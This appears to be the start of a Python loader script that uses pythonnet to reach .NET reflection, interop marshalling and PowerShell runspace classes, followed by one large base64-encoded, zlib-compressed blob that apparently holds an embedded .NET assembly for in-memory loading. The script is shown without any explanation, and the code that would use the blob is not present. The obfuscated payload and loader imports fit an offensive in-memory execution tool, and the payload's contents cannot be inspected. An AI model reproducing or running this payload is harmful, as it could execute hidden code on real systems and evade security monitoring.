import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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